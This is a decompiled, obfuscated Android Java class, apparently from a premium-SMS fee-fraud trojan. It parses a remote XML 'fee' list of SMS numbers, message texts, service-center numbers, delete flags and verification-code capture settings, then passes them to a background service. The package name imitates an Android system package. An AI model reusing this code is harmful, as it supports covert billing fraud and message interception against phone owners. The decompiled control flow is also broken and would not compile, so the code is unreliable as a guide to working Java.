package com.android.ll.logic;

import android.text.TextUtils;
import com.android.intent.http.a;
import com.android.intent.http.h;
import com.android.tools.service.SHMainService;
import java.io.IOException;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;
import org.xmlpull.v1.XmlPullParserFactory;

public final class b
  extends h
{
  private com.android.dd.data.b l;
  private SHMainService m;
  private List n = null;
  
  public b() {}
  
  private void a(XmlPullParser paramXmlPullParser)
  {
    for (;;)
    {
      try
      {
        paramXmlPullParser.require(2, null, "root");
        this.n = new ArrayList();
        if (paramXmlPullParser.nextTag() == 3)
        {
          paramXmlPullParser.require(3, null, "root");
          return;
        }
        if (!paramXmlPullParser.getName().equals("fee")) {
          continue;
        }
        this.l = new com.android.dd.data.b();
      }
      catch (XmlPullParserException paramXmlPullParser)
      {
        paramXmlPullParser.printStackTrace();
        return;
        str = paramXmlPullParser.getName();
        if (!str.equals("siteid")) {
          break label138;
        }
        this.l.a(paramXmlPullParser.nextText());
        continue;
      }
      catch (IOException paramXmlPullParser)
      {
        paramXmlPullParser.printStackTrace();
        return;
      }
      if (paramXmlPullParser.nextTag() == 3)
      {
        this.n.add(this.l);
      }
      else
      {
        String str;
        label138:
        if (str.equals("feetype")) {
          this.l.b(paramXmlPullParser.nextText());
        } else if (str.equals("feevalue")) {
          paramXmlPullParser.nextText();
        } else if (str.equals("feenotice")) {
          this.l.e(paramXmlPullParser.nextText());
        } else if (str.equals("feechanid")) {
          this.l.f(paramXmlPullParser.nextText());
        } else if (str.equals("feechanname")) {
          this.l.q(paramXmlPullParser.nextText());
        } else if (str.equals("feeurl")) {
          this.l.g(paramXmlPullParser.nextText());
        } else if (str.equals("playurl")) {
          this.l.h(paramXmlPullParser.nextText());
        } else if (str.equals("webshowurl")) {
          this.l.i(paramXmlPullParser.nextText());
        } else if (str.equals("smskey")) {
          this.l.j(paramXmlPullParser.nextText());
        } else if (str.equals("smsdel")) {
          paramXmlPullParser.nextText();
        } else if (str.equals("smscenter")) {
          this.l.k(paramXmlPullParser.nextText());
        } else if (str.equals("IntervalTime")) {
          this.l.l(paramXmlPullParser.nextText());
        } else if (str.equals("userip")) {
          paramXmlPullParser.nextText();
        } else if (str.equals("REMOTE_ADDR")) {
          paramXmlPullParser.nextText();
        } else if (str.equals("UID")) {
          paramXmlPullParser.nextText();
        } else if (str.equals("mobile")) {
          paramXmlPullParser.nextText();
        } else if (str.equals("version")) {
          paramXmlPullParser.nextText();
        } else if (str.equals("PNO")) {
          paramXmlPullParser.nextText();
        } else if (str.equals("OperatorLine")) {
          paramXmlPullParser.nextText();
        } else if (str.equals("MessageMsg")) {
          this.l.o(paramXmlPullParser.nextText());
        } else if (str.equals("MessageNumber")) {
          this.l.p(paramXmlPullParser.nextText());
        } else if (str.equals("MessageNeedRe")) {
          paramXmlPullParser.nextText();
        } else if (str.equals("MessageReContent")) {
          paramXmlPullParser.nextText();
        } else if (str.equals("Judger")) {
          paramXmlPullParser.nextText();
        } else if (str.equals("smskeysuc")) {
          paramXmlPullParser.nextText();
        } else if (str.equals("WapBusiness")) {
          this.l.r(paramXmlPullParser.nextText());
        } else if (str.equals("MessageMsg2")) {
          this.l.c(paramXmlPullParser.nextText());
        } else if (str.equals("MessageNumber2")) {
          this.l.d(paramXmlPullParser.nextText());
        } else if (str.equals("YzmBeginStr")) {
          this.l.n(paramXmlPullParser.nextText());
        } else if (str.equals("YzmDomain")) {
          this.l.m(paramXmlPullParser.nextText());
        } else {
          paramXmlPullParser.nextText();
        }
      }
    }
  }
  
  public final void a(String paramString)
  {
    if (TextUtils.isEmpty(paramString)) {}
    while (paramString.contains("您访问的内容不存在")) {
      return;
    }
    paramString = new StringReader(paramString);
    try
    {
      XmlPullParser localXmlPullParser = XmlPullParserFactory.newInstance().newPullParser();
      localXmlPullParser.setInput(paramString);
      localXmlPullParser.next();
      a(localXmlPullParser);
      localXmlPullParser.next();
      localXmlPullParser.require(1, null, null);
      return;
    }
    catch (XmlPullParserException paramString)
    {
      paramString.printStackTrace();
      return;
    }
    catch (IOException paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public final void a(String paramString, Map paramMap, SHMainService paramSHMainService, boolean paramBoolean)
  {
    this.m = paramSHMainService;
    a(paramString, j, paramMap, paramBoolean, a.a);
  }
  
  public final void a(boolean paramBoolean, String paramString)
  {
    this.m.feeListResponse(this.n, paramBoolean);
  }
}
